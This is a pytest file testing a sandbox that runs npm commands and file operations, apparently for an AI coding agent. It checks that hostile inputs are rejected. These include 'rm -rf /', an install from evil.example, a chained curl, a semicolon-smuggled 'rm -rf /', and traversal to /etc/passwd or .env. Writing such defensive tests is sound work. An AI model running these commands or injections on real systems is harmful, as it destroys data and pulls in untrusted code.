import os
import shutil

import pytest

from app.config import settings
from app.core import sandbox
from app.security import UnsafePathError


@pytest.fixture
def sb(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "runs_dir", tmp_path / "runs")
    return sandbox.create_sandbox(1, "missing-package")


def test_create_sandbox_overlays_scenario(sb):
    assert "axios" in (sb / "src" / "index.ts").read_text()
    assert (sb / "package.json").exists()
    assert not (sb / "scenario.json").exists()


def test_unknown_scenario_rejected(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "runs_dir", tmp_path / "runs")
    for bad in ("nope", "../template", "missing-package/../../app"):
        with pytest.raises(ValueError):
            sandbox.create_sandbox(2, bad)


@pytest.mark.parametrize("argv", [
    ["npm", "run", "test"],
    ["npm", "install", "axios@1.0.0"],
    ["npm", "install", "https://evil.example/pkg.tgz"],
    ["npm", "install", "../x"],
    ["npm", "install", "<pkg>"],
    ["npm", "install", "a", "b"],
    ["rm", "-rf", "/"],
    ["npm", "run", "build", "--", "&&", "curl", "x"],
    ["npm", "install", "axios; rm -rf /"],
])
def test_whitelist_rejects(sb, argv):
    with pytest.raises(ValueError):
        sandbox.run_command(sb, argv)


@pytest.mark.parametrize("path", ["../outside.txt", "/etc/passwd", "src/../../x", "C:/Windows/x"])
def test_path_traversal_blocked(sb, path):
    with pytest.raises(UnsafePathError):
        sandbox.read_file(sb, path)
    with pytest.raises(UnsafePathError):
        sandbox.write_file(sb, path, "x")


@pytest.mark.parametrize("path", [".env", ".env.local", "src/.env.production", "key.pem",
                                  "node_modules/x/index.js", ".git/config", "package-lock.json"])
def test_sensitive_paths_blocked(sb, path):
    (sb / ".env").write_text("API_KEY=supersecret")
    with pytest.raises(UnsafePathError):
        sandbox.read_file(sb, path)
    with pytest.raises(UnsafePathError):
        sandbox.write_file(sb, path, "x")


def test_read_write_inside_sandbox(sb):
    sandbox.write_file(sb, "src/new.ts", "export const x = 1;\n")
    assert sandbox.read_file(sb, "src/new.ts") == "export const x = 1;\n"
    assert len(sandbox.read_file(sb, "src/new.ts", max_chars=5)) == 5


def test_minimal_env_has_no_secrets(monkeypatch):
    monkeypatch.setenv("GROQ_API_KEY", "gsk_secret")
    monkeypatch.setenv("APP_API_KEY", "secret")
    env = sandbox._minimal_env()
    assert "GROQ_API_KEY" not in env and "APP_API_KEY" not in env
    assert env["CI"] == "1" and "PATH" in env


@pytest.mark.skipif(shutil.which("npm") is None, reason="npm not on PATH")
def test_build_fails_on_missing_package(sb):
    if not (sb / "node_modules").exists():
        pytest.skip("template node_modules not installed")
    res = sandbox.run_build(sb)
    assert res.exit_code != 0
    assert "axios" in res.output
